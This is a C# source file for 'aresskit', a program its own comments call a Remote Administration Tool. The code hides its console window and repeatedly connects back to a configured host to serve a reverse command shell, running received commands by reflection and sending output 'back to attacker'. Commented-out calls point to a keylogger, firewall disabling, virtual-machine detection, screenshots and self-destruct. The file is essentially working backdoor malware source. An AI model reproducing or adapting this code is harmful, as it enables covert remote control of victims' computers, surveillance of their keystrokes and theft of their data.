using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace aresskit
{
    class Program
    {
        const string server = "localhost";
        const int port = 9000;
        const bool hideConsole = true;

        private static void sendBackdoor(string server, int port)
        {
            try
            {
                System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient(server, port);
                System.Net.Sockets.NetworkStream stream = client.GetStream();
                string responseData;

                while (true)
                {
                    byte[] shellcode = Toolkit.byteCode("aresskit> ");

                    stream.Write(shellcode, 0, shellcode.Length); // Send Shellcode
                    byte[] data = new byte[256]; byte[] output = Toolkit.byteCode("");

                    // String to store the response ASCII representation.

                    int bytes = stream.Read(data, 0, data.Length);
                    responseData = System.Text.Encoding.ASCII.GetString(data, 0, bytes);

                    if (responseData.Contains("cd"))
                    {
                        System.IO.Directory.SetCurrentDirectory(responseData.Split(" ".ToCharArray())[1]);
                    }
                    else
                    {
                        try
                        {
                            if (!responseData.Contains("::"))
                            {
                                if (responseData == "\n") { } else
                                {
                                    output = Toolkit.byteCode("'" + responseData.Replace("\n", "") + "' is not a recognized command.\n");
                                }
                            } else
                            {
                                responseData = responseData.Trim(); // To eliminate annoying things in the string
                                string[] class_method = responseData.Split(new[] { "::" }, StringSplitOptions.None);

                                for (int i=1; i< class_method.Length; i++)
                                {
                                    Console.WriteLine("arg: " + class_method[i]);
                                }
                                
                                Type type = Type.GetType("aresskit." + class_method[0]);
                                object instance = Activator.CreateInstance(type);

                                if (type != null)
                                {
                                    var methodData = class_method[1].Split(new char[0]);
                                    MethodInfo method = type.GetMethod(methodData[0]);

                                    if (method != null)
                                    {
                                        for(int i=1; i< methodData.Length; i++)
                                        {
                                            string str = methodData[i];
                                            System.Console.WriteLine("Arg: " + str); // should output something like "Socket::ListenPort TCP 9000"
                                        }
                                        output = Toolkit.byteCode(method.Invoke(instance, methodData).ToString() + "\n");
                                    }
                                }
                            }
                        } catch (Exception e)
                        {
                            output = Toolkit.byteCode(e.ToString());
                        }
                        // try { output = Toolkit.byteCode(Toolkit.exec(responseData)); } catch (Exception) { output = Toolkit.byteCode("Command couldn't execute."); }
                    }

                    try
                    {
                        stream.Write(output, 0, output.Length); // Send output of command back to attacker.
                    }
                    catch (System.IO.IOException)
                    {
                        stream.Close();
                        client.Close();
                        break;
                    }
                }

                // Close everything.
                stream.Close();
                client.Close();
            }
            catch (System.Net.Sockets.SocketException) { } // Pass socket connection silently.
        }

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            // Hide Window
            if (hideConsole)
                ShowWindow(handle, SW_HIDE);
            
            // Fully featured Remote Administration Tool (RAT)
            /*
             * Aresskit comes equipped with networking tools and administration tools such as:
             * - Built-In Port Scanner
             * - Reverse Command Prompt Shell (minimalistic, no auth required)
             * - UDP/TCP Port Listener (similar to Netcat)
             * - File downloader/uploader
             * - Live Cam/Mic Feed
             * - Screenshot(s)
             * - Real-Time and Log-based Keylogger
             * - Self-destruct feature (protect your privacy)
            */
            aresskit.Scanner scanner = new aresskit.Scanner();
            // scanner.portScanner("localhost", null, true); // public void portScanner(string hostname, Array range, bool verbose)
            // scanner.netDiscover();
            /*
            new Thread(() =>
            {
                Thread.CurrentThread.IsBackground = true;
                scanner.portScanner("localhost", new int[] { 21, 22, 80 }, true);
            }).Start();
            */

            // scanner.portScanner("localhost", new int[] { 21, 22, 80 }, true);
            // scanner.NetDiscover();

            aresskit.Toolkit toolkit = new aresskit.Toolkit();
            // toolkit.selfDestruct();
            // toolkit.sendShell("localhost", 9000);
            // toolkit.portListener(9000, "tcp");
            // toolkit.listenShell(9000);
            // Console.WriteLine("Connected to the internet? " + toolkit.checkInternetConn("www.google.com"));
            // toolkit.Shell(9000);
            // toolkit.portListener(9000, "tcp");

            /*
            new Thread(() =>
            {
                Thread.CurrentThread.IsBackground = true;
                Console.WriteLine("Thread is running...");
                // run your code here
                toolkit.sendShell("localhost", 9000);
            }).Start();
            */
            // toolkit.sendShell("localhost", 9000);

            aresskit.Administration system = new aresskit.Administration();
            // Console.WriteLine("Running in Virtual Machine? " + system.DetectVirtualMachine());
            // Console.WriteLine("Running as Administrator? " + system.IsAdmin());
            // Console.WriteLine(system.IsAdministrator() == true ? system.FirewallStatus(false) : false); // if admin is true, disable firewall

            /*
            new Thread(() =>
            {
                Thread.CurrentThread.IsBackground = true;
                Console.WriteLine("Thread is running...");

                InterceptKeys.logKeys();
            }).Start();
            */

            // ScreenShot.CaptureAndSave(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, @"C:\\development\\Capture.png");

            while (true)
            {
                if (toolkit.checkInternetConn("www.google.com") == true)
                {
                    try
                    {
                        Console.WriteLine("Sending RAT terminal to: {0}, port: {1}", server, port);
                        sendBackdoor(server, port);
                    }
                    catch (Exception)
                    { } // pass silently
                }
                System.Threading.Thread.Sleep(5000); // sleep for 5 seconds before retrying
            }

            // Console.ReadKey();
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_SHOW = 1;
        const int SW_HIDE = 0;
    }
}
